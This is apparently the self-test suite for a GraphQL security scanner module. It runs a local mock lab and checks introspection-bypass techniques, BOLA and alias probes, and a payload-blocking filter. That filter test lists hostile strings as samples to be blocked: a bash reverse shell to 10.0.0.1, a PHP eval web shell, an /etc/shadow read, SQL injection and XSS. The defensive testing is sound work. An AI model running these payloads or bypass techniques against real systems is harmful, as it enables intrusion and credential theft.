#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
=============================================================================
 WASP P18 SELF-TEST SUITE - mod_graphql.py v19.0.0 FULL ULTRA PRO MAX++ (P18)
=============================================================================
 Mock GraphQL lab + full assertion suite:
   - Unit tests (query builders / INERT enforcement / suggestion parser /
     error-kind classifier / sensitive scorer / authz classifier / v19
     secret-body builders: unicode-escape, dup-keys, multipart)
   - Introspection engine unit (OPEN + DISABLED + WAF paths) + bypass matrix
     unit (14 techniques, exactly 1 leak) + v19 bypass2 matrix unit (17
     SECRET techniques, exactly 6 leaks on /graphql_waf) + error-mining
   - Discovery unit (P17/P6/P11/P7/P5/P8 seed mining + cold pool)
   - Active run e2e gate-OFF (stages A..S) + RoE-gate-skip documentation
   - Gated run (bola canary + alias-amplified + batch/depth guards + CSRF
     CT + WS hint + subs-deep + timing-oracle) - sab hard caps ke andar
   - v19 labs: WAF literal-filter endpoint, federation _entities, role-
     header trust echo, ftv1 tracing, raw SDL endpoint, shadow schemas
   - Artifact integrity (35+ outputs, matrix >= 140 rows, chains >= 15)
   - RWX rule (0777 on every result file) + zero-external-egress
   - REDACTION check (bodies sirf len/sha1 - content stored nahi hota)
   - Passive mode (allow_active=False -> 0 probes) + checkpoint replay
   - CLI + import hygiene (-W error clean)
 Detection-only discipline honored: lab me bhi koi exploit payload nahi;
 mutations lab me bhi kabhi well-formed execute nahi hote.
=============================================================================
"""
# --- WASP v2.2 layout bootstrap (auto-inserted: phases/<block> paths) ---
import os as _wasp_os, sys as _wasp_sys
_WASP_ROOT = _wasp_os.path.dirname(_wasp_os.path.dirname(_wasp_os.path.abspath(__file__)))
_WASP_PHASE = _wasp_os.path.join(_WASP_ROOT, "phases", "block4_api_logic")
for _wasp_p in (_WASP_ROOT, _WASP_PHASE):
    if _wasp_p not in _wasp_sys.path:
        _wasp_sys.path.insert(0, _wasp_p)
# --- end bootstrap ---

import os
import io
import re
import sys
import json
import shutil
import hashlib
import contextlib
import threading
import subprocess
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlsplit, parse_qs

HERE = os.path.dirname(os.path.abspath(__file__))
ULTRA = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "phases", "block4_api_logic")
sys.path.insert(0, ULTRA)
sys.path.insert(0, HERE)

import mod_graphql as MG                                           # noqa: E402
import wasp_core as WC                                             # noqa: E402

BASE = os.path.join(HERE, "p18_test_base")
BASE_GATED = os.path.join(HERE, "p18_test_base_gated")
BASE2 = os.path.join(HERE, "p18_test_base_passive")
ENG = "p18lab"
ENG_G = "p18lab2"
ENG_P = "p18labp"

PASS, FAIL = [], []


def check(name, cond, detail=""):
    if cond:
        PASS.append((name, ""))
        print("  [PASS] %s" % name)
    else:
        FAIL.append((name, detail))
        print("  [FAIL] %s -> %s" % (name, str(detail)[:140]))


# ===========================================================================
# MOCK GRAPHQL LAB (detection-only sim - sab responses INERT)
# ===========================================================================
LAB = {"posts": 0}


def _j(self, code, obj, hdrs=None):
    b = json.dumps(obj).encode("utf-8")
    self.send_response(code)
    self.send_header("Content-Type", "application/json")
    self.send_header("Content-Length", str(len(b)))
    for k, v in (hdrs or {}).items():
        self.send_header(k, v)
    self.end_headers()
    self.wfile.write(b)


def _txt(self, code, s, ct="text/plain", hdrs=None):
    b = s.encode("utf-8")
    self.send_response(code)
    self.send_header("Content-Type", ct)
    self.send_header("Content-Length", str(len(b)))
    for k, v in (hdrs or {}).items():
        self.send_header(k, v)
    self.end_headers()
    self.wfile.write(b)


def _gql(self, obj, code=200, tracing=False):
    """GraphQL JSON response with CORS + rate + Server headers."""
    hdrs = {"Access-Control-Allow-Origin": "*",
            "X-RateLimit-Limit": "100",
            "X-RateLimit-Remaining": "97",
            "Server": "apollo-server/3.5.0-wasp-lab"}
    if tracing:
        obj = dict(obj)
        obj["extensions"] = {"tracing": {"version": 1, "startTime": 1}}
    _j(self, code, obj, hdrs)


def _err(msg, code="GRAPHQL_ERROR"):
    return {"errors": [{"message": msg, "extensions": {"code": code}}]}


SHALLOW_SCHEMA = {"data": {"__schema": {
    "queryType": {"name": "Query"},
    "mutationType": {"name": "Mutation"},
    "subscriptionType": None}}}

SDL_TEXT = ("type Query { users: [User!]! user(id: ID!): User me: User "
            "adminConfig: AdminConfig fetchUrl(url: String): String "
            "legacyTokens: Token }\n"
            "type User { id: ID! email: String! role: String password: "
            "String }\n"
            "type InternalAudit { note: String! }\n")

STEP1_TYPES = {"data": {"__schema": {"types": [
    {"name": "Query", "kind": "OBJECT"},
    {"name": "User", "kind": "OBJECT"},
    {"name": "Mutation", "kind": "OBJECT"},
    {"name": "FileUpload", "kind": "OBJECT"},
    {"name": "Upload", "kind": "SCALAR"},
    {"name": "AdminConfig", "kind": "OBJECT"},
    {"name": "String", "kind": "SCALAR"},
    {"name": "ID", "kind": "SCALAR"}]}}}

FULL_SCHEMA_DOC = {"data": {"__schema": {
    "queryType": {"name": "Query"},
    "mutationType": {"name": "Mutation"},
    "subscriptionType": None,
    "types": [
        {"kind": "OBJECT", "name": "Query", "fields": [
            {"name": "users", "args": [],
             "type": {"kind": "LIST", "name": None, "ofType": {
                 "kind": "OBJECT", "name": "User"}},
             "isDeprecated": False, "deprecationReason": None},
            {"name": "user", "args": [
                {"name": "id", "type": {"kind": "SCALAR", "name": "ID",
                                        "ofType": None}}],
             "type": {"kind": "OBJECT", "name": "User", "ofType": None},
             "isDeprecated": False, "deprecationReason": None},
            {"name": "me", "args": [],
             "type": {"kind": "OBJECT", "name": "User", "ofType": None},
             "isDeprecated": False, "deprecationReason": None},
            {"name": "adminConfig", "args": [],
             "type": {"kind": "OBJECT", "name": "AdminConfig",
                      "ofType": None},
             "isDeprecated": False, "deprecationReason": None},
            {"name": "fetchUrl", "args": [
                {"name": "url", "type": {"kind": "SCALAR", "name": "String",
                                         "ofType": None}}],
             "type": {"kind": "SCALAR", "name": "String", "ofType": None},
             "isDeprecated": False, "deprecationReason": None},
            {"name": "legacyTokens", "args": [],
             "type": {"kind": "OBJECT", "name": "Token", "ofType": None},
             "isDeprecated": True, "deprecationReason": "use tokens"}],
         "inputFields": None, "enumValues": None, "interfaces": []},
        {"kind": "OBJECT", "name": "User", "fields": [
            {"name": "id", "args": [],
             "type": {"kind": "SCALAR", "name": "ID", "ofType": None},
             "isDeprecated": False, "deprecationReason": None},
            {"name": "email", "args": [],
             "type": {"kind": "SCALAR", "name": "String", "ofType": None},
             "isDeprecated": False, "deprecationReason": None},
            {"name": "role", "args": [],
             "type": {"kind": "SCALAR", "name": "String", "ofType": None},
             "isDeprecated": False, "deprecationReason": None},
            {"name": "password", "args": [],
             "type": {"kind": "SCALAR", "name": "String", "ofType": None},
             "isDeprecated": False, "deprecationReason": None}],
         "inputFields": None, "enumValues": None, "interfaces": []},
        {"kind": "OBJECT", "name": "Mutation", "fields": [
            {"name": "login", "args": [
                {"name": "email", "type": {"kind": "SCALAR",
                                           "name": "String",
                                           "ofType": None}},
                {"name": "password", "type": {"kind": "SCALAR",
                                              "name": "String",
                                              "ofType": None}}],
             "type": {"kind": "SCALAR", "name": "String", "ofType": None},
             "isDeprecated": False, "deprecationReason": None},
            {"name": "updateUser", "args": [
                {"name": "id", "type": {"kind": "SCALAR", "name": "ID",
                                        "ofType": None}}],
             "type": {"kind": "OBJECT", "name": "User", "ofType": None},
             "isDeprecated": False, "deprecationReason": None}],
         "inputFields": None, "enumValues": None, "interfaces": []},
        {"kind": "OBJECT", "name": "FileUpload", "fields": [
            {"name": "file", "args": [
                {"name": "upload", "type": {"kind": "SCALAR",
                                            "name": "Upload",
                                            "ofType": None}}],
             "type": {"kind": "SCALAR", "name": "String", "ofType": None},
             "isDeprecated": False, "deprecationReason": None}],
         "inputFields": None, "enumValues": None, "interfaces": []},
        {"kind": "SCALAR", "name": "Upload", "fields": None,
         "inputFields": None, "enumValues": None, "interfaces": []},
        {"kind": "OBJECT", "name": "AdminConfig", "fields": [
            {"name": "setting", "args": [],
             "type": {"kind": "SCALAR", "name": "String", "ofType": None},
             "isDeprecated": False, "deprecationReason": None}],
         "inputFields": None, "enumValues": None, "interfaces": []},
        {"kind": "INPUT_OBJECT", "name": "UpdateUserInput",
         "fields": None,
         "inputFields": [
             {"name": "email", "type": {"kind": "SCALAR",
                                         "name": "String",
                                         "ofType": None}},
             {"name": "role", "type": {"kind": "SCALAR",
                                        "name": "String",
                                        "ofType": None}},
             {"name": "isAdmin", "type": {"kind": "SCALAR",
                                          "name": "Boolean",
                                          "ofType": None}},
             {"name": "ownerId", "type": {"kind": "SCALAR",
                                          "name": "ID",
                                          "ofType": None}}],
         "enumValues": None, "interfaces": None}],
    "directives": []}}}

FEDERATION_SDL = {"data": {"_service": {"sdl":
    "type Query { users: [User!]! user(id: ID!): User }\n"
    "  type User { id: ID! email: String! }"}}}


def _field_sugg(field, typ="Query", suggs=("users", "me", "adminConfig")):
    s = ", ".join("'%s'" % s for s in suggs)
    return _err("Cannot query field '%s' on type '%s'. Did you mean %s?"
                % (field, typ, s))


def _gql_route(self, p, body, ct, tracing_hdr, hasura=None):
    """Core GraphQL resolver sim (shared /graphql | /graphql_noguard |
    /graphql_waf app-layer)."""
    noguard = (p == "/graphql_noguard")
    ungated = noguard or (p == "/graphql_waf")
    tracing = bool(tracing_hdr)
    # --- v19 multipart/form-data body (graphql-multipart-request) ---
    if "multipart/form-data" in (ct or ""):
        m = re.search(rb'name="query"\r?\n\r?\n(.*?)\r\n--', body, re.S)
        if not m:
            return _gql(self, _err("bad multipart"), tracing=tracing)
        body = ('{"query":%s}' % json.dumps(
            m.group(1).decode("utf-8", "ignore"))).encode("utf-8")
    # --- batch (array body) ---
    if body.strip().startswith(b"["):
        if noguard or p == "/graphql":
            return _gql(self, [{"data": {"__typename": "Query"}},
                               {"data": {"__schema": {"queryType": {
                                   "name": "Query"}}}}], tracing=tracing)
        return _gql(self, _err("batching is not allowed on this server"),
                    tracing=tracing)
    # --- APQ (persistedQuery extensions) ---
    if b"persistedQuery" in body:
        return _gql(self, _err("PersistedQueryNotFound",
                               "PERSISTED_QUERY_NOT_FOUND"),
                    tracing=tracing)
    try:
        obj = json.loads(body.decode("utf-8", "ignore"))
        q = str(obj.get("query", ""))
    except Exception:
        return _gql(self, _err("bad query"), tracing=tracing)
    # --- federation ---
    if "_service" in q:
        return _gql(self, FEDERATION_SDL, tracing=tracing)
    # --- v19 federation _entities (canary representation) ---
    if "_entities" in q:
        return _gql(self, {"data": {"_entities": [
            {"__typename": "User", "id": "waspP18-echo"}]}},
            tracing=tracing)
    # --- introspection ---
    if "__schema" in q or "__type(" in q or "IntrospectionQuery" in q:
        if "queryType" in q and "types" not in q and "fields" not in q:
            return _gql(self, SHALLOW_SCHEMA, tracing=tracing)
        if "types { name kind }" in q or ("types" in q and
                                          "kind" in q and
                                          "fields" not in q):
            return _gql(self, STEP1_TYPES, tracing=tracing)
        if "__type(name:" in q:
            resp = {"data": {"__type": {
                "name": "User", "kind": "OBJECT", "fields": [
                    {"name": "id"}, {"name": "email"}, {"name": "role"},
                    {"name": "password"}]}}}
            if noguard:
                resp["data"]["__type"]["fields"].append(
                    {"name": "internalAudit"})
            return _gql(self, resp, tracing=tracing)
        if noguard:
            full = json.loads(json.dumps(FULL_SCHEMA_DOC))
            full["data"]["__schema"]["types"].append(
                {"kind": "OBJECT", "name": "InternalAudit", "fields": [
                    {"name": "note", "args": [],
                     "type": {"kind": "SCALAR", "name": "String",
                              "ofType": None},
                     "isDeprecated": False, "deprecationReason": None}],
                    "inputFields": None, "enumValues": None,
                    "interfaces": []})
            return _gql(self, full, tracing=tracing)
        return _gql(self, FULL_SCHEMA_DOC, tracing=tracing)
    # --- deep-nesting guard (c0 { c1 { ... } } non-alias form) ---
    if re.search(r"c\d+\s*\{", q) and q.count("{") > 4:
        if ungated:
            return _gql(self, {"data": {"c0": {"c1": {"c2": {"c3": {
                "c4": {"__typename": "Query"}}}}}}}, tracing=tracing)
        return _gql(self, _err("Query depth limit exceeded (max 3)",
                               "DEPTH_LIMIT_EXCEEDED"), tracing=tracing)
    # --- alias-count guard (__typename aliases) ---
    aliases = len(re.findall(r"\w+:\s*__typename", q))
    if aliases >= 4:
        if ungated:
            data = {"a%d" % i: "Query" for i in range(aliases)}
            return _gql(self, {"data": data}, tracing=tracing)
        return _gql(self, _err("Too many aliases (max 3)",
                               "ALIAS_LIMIT_EXCEEDED"), tracing=tracing)
    # --- mutation validation (KABHI execute nahi - sirf error shape) ---
    if q.strip().startswith("mutation"):
        m = re.search(r"\{\s*(\w+)", q)
        fld = m.group(1) if m else "unknown"
        return _gql(self, _err("Cannot query field '%s' on type "
                               "'Mutation'. Did you mean 'login'?" % fld),
                    tracing=tracing)
    # --- resolvers ---
    if re.search(r"\buser\s*\(", q):
        mid = re.search(r'id\s*:\s*"([^"]*)"', q)
        uid = mid.group(1) if mid else "?"
        if "br}" in uid:
            return _gql(self, _err("GraphQLParseError: SyntaxError near "
                                   "token '}'"), tracing=tracing)
        nal = len(re.findall(r"\w+:\s*user\s*\(", q))
        if nal >= 3:
            data = {}
            for i in range(nal):
                data["c%d" % i] = {"id": uid, "__typename": "User"}
            return _gql(self, {"data": data}, tracing=tracing)
        return _gql(self, {"data": {"user": {"id": uid,
                                             "__typename": "User"}}},
                    tracing=tracing)
    if re.search(r"\bfetchUrl\b", q):
        mid = re.search(r'url\s*:\s*"([^"]*)"', q)
        host = urlsplit(mid.group(1)).netloc if mid else "unknown.invalid"
        return _gql(self, _err("could not resolve host: %s (getaddrinfo "
                               "failed)" % host), tracing=tracing)
    if re.search(r"\busers\b", q):
        if re.search(r"\bpassword\b", q):
            return _gql(self, _err("Unauthorized on field 'password'",
                                   "FORBIDDEN"), tracing=tracing)
        # v19: nested field validation -> User-type suggestion oracle
        sub = re.search(r"users\s*\{\s*([A-Za-z_][A-Za-z0-9_]*)", q)
        if sub and sub.group(1) not in ("id", "email", "role",
                                        "password", "__typename"):
            return _gql(self, _err("Cannot query field '%s' on type "
                                   "'User'. Did you mean 'id', 'email'?"
                                   % sub.group(1)), tracing=tracing)
        return _gql(self, {"data": {"users": [
            {"id": "1", "email": "u1@wasp-lab.invalid", "role": "user",
             "__typename": "User"},
            {"id": "2", "email": "u2@wasp-lab.invalid", "role": "admin",
             "__typename": "User"}]}}, tracing=tracing)
    if re.search(r"\bme\b", q):
        return _gql(self, {"data": {"me": {"__typename": "User"}}},
                    tracing=tracing)
    if re.search(r"\badminConfig\b", q):
        return _gql(self, _err("Unauthorized on field 'adminConfig'",
                               "UNAUTHENTICATED"), tracing=tracing)
    if re.search(r"\bsecrets\b", q):
        return _gql(self, _err("Unauthorized on field 'secrets'",
                               "UNAUTHENTICATED"), tracing=tracing)
    if re.search(r"\blegacyTokens\b", q):
        return _gql(self, {"data": {"legacyTokens": {
            "__typename": "Token"}}}, tracing=tracing)
    if re.search(r"\bsecret\b", q):
        return _gql(self, _err("Cannot query field 'secret' on type "
                               "'Query'. Did you mean 'secrets'?"),
                    tracing=tracing)
    if "__typename" in q:
        # plain __typename probe (fields branch checks upar ho chuke)
        # v19: X-Hasura-Role family trust sim (invalid role echoed)
        tn = "HasuraRoleEcho" if hasura else "Query"
        return _gql(self, {"data": {"__typename": tn}},
                    tracing=tracing)
    # --- unknown field: did-you-mean suggestions ---
    m = re.search(r"\{\s*([A-Za-z_][A-Za-z0-9_]*)\s*\}", q)
    fld = m.group(1) if m else "unknown"
    return _gql(self, _field_sugg(fld), tracing=tracing)


class LabHandler(BaseHTTPRequestHandler):
    def log_message(self, *a):
        pass

    def _read_body(self):
        ln = int(self.headers.get("Content-Length", 0) or 0)
        return self.rfile.read(ln) if ln else b""

    def do_GET(self):
        p = urlsplit(self.path).path
        q = parse_qs(urlsplit(self.path).query)
        if p in ("/graphql", "/graphql_noguard"):
            if "query" in q:
                LAB["posts"] = LAB.get("posts", 0) + 1
                return _gql(self, {"data": {"__typename": "Query"}})
            return _txt(self, 405, "GET not supported (use POST)")
        if p == "/graphql_waf":
            # v19: GET-protocol app route (edge WAF POST-body-only -> miss)
            if "query" in q:
                LAB["posts"] = LAB.get("posts", 0) + 1
                return _gql_route(self, "/graphql_waf", json.dumps(
                    {"query": q["query"][0]}).encode("utf-8"),
                    "application/json", False)
            return _txt(self, 405, "GET not supported (use POST)")
        if p == "/graphql_blocked":
            return _txt(self, 405, "GET not supported")
        if p == "/schema.graphql":
            # v19: raw SDL disclosure endpoint (introspection-off bypass)
            return _txt(self, 200, SDL_TEXT, ct="text/plain")
        if p == "/graphiql":
            return _txt(self, 200, "<html><head><title>GraphiQL "
                        "2.0</title></head><body>graphiql.min.js "
                        "wasp-lab IDE</body></html>", ct="text/html")
        if p == "/playground":
            return _txt(self, 200, "<html><head><title>GraphQL "
                        "Playground</title></head><body>"
                        "graphql-playground-react</body></html>",
                        ct="text/html")
        if p == "/voyager":
            return _txt(self, 200, "<html><head><title>GraphQL "
                        "Voyager</title></head><body>graphql-voyager "
                        "wasp-lab</body></html>", ct="text/html")
        if p == "/.well-known/apollo/server-health":
            return _j(self, 200, {"status": "pass"})
        if p == "/ws":
            up = (self.headers.get("Upgrade") or "").lower()
            if up == "websocket":
                return _txt(self, 426, "Upgrade Required",
                            {"Connection": "Upgrade",
                             "Upgrade": "websocket"})
            return _j(self, 404, {"error": "not found"})
        return _j(self, 404, {"error": "not found",
                              "code": "resource_missing"})

    def do_POST(self):
        p = urlsplit(self.path).path
        body = self._read_body()
        LAB["posts"] = LAB.get("posts", 0) + 1
        ct = (self.headers.get("Content-Type") or "").lower()
        tracing_hdr = self.headers.get("X-Apollo-Tracing") or \
            self.headers.get("apollo-federation-include-trace")
        # v19: edge-misroute sim (X-Original-URL honored BEFORE routing/
        # WAF - path-scoped WAF rule miss)
        xourl = self.headers.get("X-Original-URL")
        if xourl:
            p = urlsplit(xourl).path or p
        if p in ("/graphql", "/graphql_noguard"):
            if "application/x-www-form-urlencoded" in ct:
                return _j(self, 400, {"error": "unsupported content-type"})
            return _gql_route(self, p, body, ct, tracing_hdr,
                              self.headers.get("X-Hasura-Role"))
        if p == "/graphql_waf":
            return _waf_route(self, body, ct)
        if p == "/graphql_blocked":
            # CT-routing bypass sim: form-urlencoded par introspection
            # guard MISS ho jaata hai (classic single-path-hardening bug)
            if "application/x-www-form-urlencoded" in ct:
                if b"__schema" in body:
                    return _gql(self, SHALLOW_SCHEMA)
                return _j(self, 400, {"error": "bad request"})
            return _blocked_route(self, body)
        return _j(self, 404, {"error": "not found",
                              "code": "resource_missing"})


def _waf_route(self, body, ct):
    """v19 WAF sim: app introspection ON, edge WAF literal-filter on
    POST json/text bodies (path-scoped rule); app has NO depth/alias
    guards (edge-trust story)."""
    if body.strip().startswith(b"["):
        # WAF array-inspection miss: batch accepted at app
        return _gql(self, [{"data": {"__typename": "Query"}},
                           {"data": {"__schema": {"queryType": {
                               "name": "Query"}}}}])
    ct0 = ct.split(";")[0].strip()
    if ct0 in ("application/json", "text/plain"):
        try:
            txt = body.decode("utf-8", "ignore")
        except Exception:
            txt = ""
        if "__schema" in txt or "_service" in txt:
            return _j(self, 403, _err("GraphQL introspection is not "
                                      "allowed by this server",
                                      "INTROSPECTION_DISABLED"))
    b2 = body
    if "charset=utf-16" in ct:
        try:
            b2 = body.decode("utf-16-le").encode("utf-8")
        except Exception:
            b2 = body
    return _gql_route(self, "/graphql_waf", b2, ct, False)


def _blocked_route(self, body):
    """Introspection-disabled endpoint: guard + suggestions ON."""
    if body.strip().startswith(b"["):
        return _gql(self, _err("batching is not allowed on this server"))
    try:
        obj = json.loads(body.decode("utf-8", "ignore"))
        q = str(obj.get("query", ""))
    except Exception:
        return _gql(self, _err("bad query"))
    if "__schema" in q or "__type(" in q or "__Schema" in q or \
            "__SCHEMA" in q or "_service" in q:
        return _gql(self, _err("GraphQL introspection is not allowed by "
                               "this server", "INTROSPECTION_DISABLED"))
    if q.strip().startswith("mutation"):
        m = re.search(r"\{\s*(\w+)", q)
        fld = m.group(1) if m else "unknown"
        return _gql(self, _err("Cannot query field '%s' on type "
                               "'Mutation'. Did you mean 'login'?" % fld))
    if re.search(r"__typename.*\busers\b|\busers\b.*__typename", q, re.S):
        return _gql(self, {"data": {"__typename": "Query", "users": [
            {"__typename": "User"}]}})
    if re.search(r"\bme\b", q):
        return _gql(self, {"data": {"me": {"__typename": "User"}}})
    if re.search(r"\badminConfig\b", q):
        return _gql(self, _err("Unauthorized on field 'adminConfig'",
                               "UNAUTHENTICATED"))
    if re.search(r"\bsecrets\b", q):
        return _gql(self, _err("Unauthorized on field 'secrets'",
                               "UNAUTHENTICATED"))
    if re.search(r"\bsecret\b", q):
        return _gql(self, _err("Cannot query field 'secret' on type "
                               "'Query'. Did you mean 'secrets'?"))
    m = re.search(r"\{\s*([A-Za-z_][A-Za-z0-9_]*)\s*\}", q)
    fld = m.group(1) if m else "unknown"
    return _gql(self, _field_sugg(fld))


def _start_lab():
    srv = ThreadingHTTPServer(("127.0.0.1", 0), LabHandler)
    port = srv.server_address[1]
    th = threading.Thread(target=srv.serve_forever, daemon=True)
    th.start()
    return srv, port



# ===========================================================================
# SEED FIXTURES (P17/P6/P11/P7/P5/P8 artifacts -> P18 guide seeds)
# ===========================================================================
def _w(base, sub, name, content):
    d = os.path.join(base, sub)
    os.makedirs(d, exist_ok=True)
    p = os.path.join(d, name)
    os.makedirs(os.path.dirname(p), exist_ok=True)
    with open(p, "w", encoding="utf-8") as f:
        if isinstance(content, str):
            f.write(content)
        else:
            json.dump(content, f, indent=1)
    os.chmod(p, 0o777)
    return p


def _seed(base, eng, origin):
    if os.path.isdir(os.path.join(base, eng)):
        shutil.rmtree(os.path.join(base, eng))
    os.makedirs(os.path.join(base, eng), exist_ok=True)
    _w(base, "", "scope.json", {
        "authorized": True, "engagement": eng,
        "authorization_reference": "P18 selftest SOW v1",
        "targets": [origin],
        "notes": "no-DoS; detection-only INERT lab; gates lab-only"})
    # ---- P17 api feedforward (guide handoff: to_phase18_graphql) ----
    _w(base, eng, "api/feedforward.json", {"routing": {
        "to_phase18_graphql": {
            "gql_endpoints": [origin + "/graphql",
                              origin + "/graphql_blocked",
                              origin + "/graphql_waf"],
            "gql_probe": {"url": origin + "/graphql",
                          "status": 200, "typename_ok": True},
            "note": "introspection/field-authz/BOLA P18 me"}}})
    # ---- P6 tech: graphql_surface.json (guide seed: introspection) ----
    _w(base, eng, "tech/graphql_surface.json", {
        "hosts": {origin + "/graphql_noguard": {"endpoints": [
            origin + "/graphql_noguard"], "introspection": {"open": True}},
            origin: {"endpoints": [origin + "/graphql"]}}})
    # ---- P11 access: graphql_bola.json (guide seed: BOLA engine) ----
    _w(base, eng, "access/graphql_bola.json", {
        "endpoints_live": [origin + "/graphql"],
        "id_arg_live": ["user"],
        "bola": {"type": "user", "endpoint": origin + "/graphql"},
        "ops_from_p7": ["users", "adminConfig"]})
    _w(base, eng, "access/feedforward.json", {"routing": {
        "to_phase18_graphql": {
            "live_endpoints": [origin + "/graphql"],
            "bola_types": ["user"],
            "id_arg_live": ["user"],
            "ops": ["users", "adminConfig"],
            "ultra": {"introspection_bypass": [],
                      "alias_bola": None,
                      "batching": None,
                      "field_suggestions": []}}}})
    # ---- P7 js: graphql_endpoints + graphql_ops ----
    _w(base, eng, "js/graphql_endpoints.txt", origin + "/graphql\n")
    _w(base, eng, "js/graphql_ops.txt", "users\nadminConfig\nme\n")
    # ---- P5 content + P3 + P8 ----
    _w(base, eng, "content/api_endpoints.txt",
       origin + "/graphql\n" + origin + "/api/v1/users\n")
    _w(base, eng, "content/endpoints.txt", origin + "/graphql\n")
    _w(base, eng, "passive/api_like.txt", origin + "/graphql\n")
    _w(base, eng, "surface/priority_queue.json", {"queue": [
        {"url": origin + "/graphql", "score": 90}]})


def _scope_stub():
    class _S:
        engagement = ENG
        def seed_urls(self):
            return [LAB["origin"]]
        def describe(self):
            return "stub"
    return _S()


def _read(p):
    try:
        with open(p, encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return None


def _read_txt(p):
    try:
        with open(p, encoding="utf-8") as f:
            return f.read()
    except Exception:
        return None


# ===========================================================================
# UNIT TESTS
# ===========================================================================
def unit_payloads():
    print("\n== UNIT: query builders + payload libs ==")
    c = MG._canary("ut")
    check("canary family", c.startswith("waspP18"), c)
    b = MG.gql_json_body(MG.Q_TYPENAME)
    check("gql body json", json.loads(b)["query"] == MG.Q_TYPENAME)
    MG.assert_inert(b, "ut")
    check("canary in redacted note", "P18" in MG.REDACTED_NOTE)
    # deep query builder
    d1 = MG.deep_query(1)
    check("deep 1 = leaf", d1 == "{ __typename }", d1)
    d5 = MG.deep_query(5)
    check("deep 5 levels", d5.count("{") == 6 and d5.count("}") == 6,
          d5)
    d9 = MG.deep_query(9)
    check("deep cap 5", d9.count("{") == 6, d9)
    check("deep no circular fragments", "fragment" not in d5)
    a5 = MG.alias_query("__typename", 5)
    check("alias 5", a5.count("__typename") == 5, a5)
    a9 = MG.alias_query("__typename", 9)
    check("alias cap 5", a9.count("__typename") == 5, a9)
    b2 = MG.batch_body([MG.Q_TYPENAME, MG.Q_QUERY_TYPE_NAME], c)
    check("batch 2 elements", len(json.loads(b2)) == 2)
    b1 = MG.batch_body([MG.Q_TYPENAME] * 5, c)
    check("batch cap 2", len(json.loads(b1)) == 2, b1)
    # introspection builders
    check("full introspection shape",
          "__schema" in MG.FULL_INTROSPECTION_QUERY and
          "fragment" in MG.FULL_INTROSPECTION_QUERY)
    check("shallow shape", "queryType" in MG.Q_INTROSPECTION_SHALLOW)
    check("federation sdl query", "_service" in MG.Q_FEDERATION_SDL)
    bv = MG.bypass_variants("http://x/graphql")
    check("bypass variants 14", len(bv) == 14, len(bv))
    ids = [v[0] for v in bv]
    for want in ("get-query", "ct-application-graphql",
                 "ct-form-urlencoded", "ct-text-plain", "case-__Schema",
                 "federation-sdl", "batch-wrapped", "path-slash"):
        check("bypass variant %s" % want, want in ids, ids)
    for v in bv:
        if v[4] is not None:
            MG.assert_inert(v[4], "bypass-%s" % v[0])
    check("all bypass bodies INERT", True)
    # ---- v19 ULTRA++ builder units ----
    bv2 = MG.bypass_variants_v2("http://x/graphql")
    check("bypass2 variants 17", len(bv2) == 17, len(bv2))
    ids2 = [v[0] for v in bv2]
    for want in ("json-unicode-escape", "json-duplicate-keys",
                 "variables-introspection", "ct-multipart-form",
                 "hpp-query-and-body", "charset-utf16", "utf8-bom",
                 "header-x-original-url", "get-query-introspection",
                 "path-semicolon"):
        check("bypass2 variant %s" % want, want in ids2, ids2)
    for v in bv2:
        if v[4] is not None:
            MG.assert_inert(v[4], "bypass2-%s" % v[0])
    check("all bypass2 bodies INERT", True)
    ub = MG.gql_json_body_unicode(MG.Q_QUERY_TYPE_NAME)
    check("unicode body raw-miss", b"__schema" not in ub, ub[:60])
    check("unicode body decode-ok",
          json.loads(ub.decode())["query"] == MG.Q_QUERY_TYPE_NAME)
    db = MG.gql_json_body_dupkeys("{ __typename }",
                                  MG.Q_QUERY_TYPE_NAME)
    check("dupkeys last-win", json.loads(
        db.decode())["query"] == MG.Q_QUERY_TYPE_NAME)
    check("dupkeys raw first-value",
          b"{ __typename }" in db)
    mb = MG.multipart_query_body(MG.Q_QUERY_TYPE_NAME)
    check("multipart body shape", b'name="query"' in mb and
          b"waspP18bnd" in mb)
    check("SDL paths >= 6", len(MG.SDL_PATHS) >= 6, MG.SDL_PATHS)
    check("WS paths 4", len(MG.WS_PATHS) == 4, MG.WS_PATHS)
    check("entities query shape", "_entities" in MG.Q_ENTITIES and
          "representations" in MG.Q_ENTITIES)
    sh = MG.shadow_schema_diff({
        "http://a/g": {"state": "OPEN", "schema": {"types":
                                                    ["Query", "X"]}},
        "http://b/g": {"state": "OPEN", "schema": {"types":
                                                    ["Query"]}}})
    check("shadow diff rows", len(sh.get("rows", [])) == 1 and
          sh["rows"][0]["only_a"] == ["X"], sh)
    check("GQL path pool 26", len(MG.GQL_PATH_POOL) >= 26,
          len(MG.GQL_PATH_POOL))
    check("mining wordlist 40", len(MG.MINING_FIELD_WORDLIST) >= 40,
          len(MG.MINING_FIELD_WORDLIST))
    check("sensitive patterns 20+", len(MG.SENSITIVE_FIELD_PATTERNS) >= 20)
    check("resolver id args 10+", len(MG.RESOLVER_ID_ARGS) >= 10)
    check("url arg patterns 12+", len(MG.URL_ARG_PATTERNS) >= 12)
    check("engine sigs 10+", len(MG.ENGINE_SIGS) >= 10)
    check("introspection block msgs 8+",
          len(MG.INTROSPECTION_BLOCK_MSGS) >= 8)
    toks = MG.invalid_token_pool(c)
    check("token pool 3 roles", len(toks) == 3, len(toks))
    check("tokens all invalid/synthetic",
          all(t is None or ("waspP18" in t or
                            t.startswith(("eyJ", "Bearer eyJ")))
              for _, t in toks))
    for role, tok in toks:
        if tok:
            MG.assert_inert(tok.encode(), "token-" + role)


def unit_inert_safety():
    print("\n== UNIT: INERT enforcement (crown discipline) ==")
    evil = [
        b"<?php eval($_POST['x']); ?>",
        b"{{7*7}}<script>alert(1)</script>",
        b"../../etc/passwd",
        b"' UNION SELECT password FROM users--",
        b"BEGIN RSA PRIVATE KEY",
        b"system('cat /etc/shadow')",
        b"document.cookie",
        b"bash -i >& /dev/tcp/10.0.0.1/4444",
        b"mutation { deleteUser(id: 1) { ok } }",  # well-formed mutation
    ]
    for e in evil:
        try:
            MG.assert_inert(e, "evil-test")
            check("evil blocked: %s" % e[:20], False, "NOT blocked")
        except ValueError:
            check("evil blocked: %s" % e[:20], True)
    check("forbidden patterns 25+",
          len(MG.FORBIDDEN_CONTENT_PATTERNS) >= 25,
          len(MG.FORBIDDEN_CONTENT_PATTERNS))
    # canary queries pass
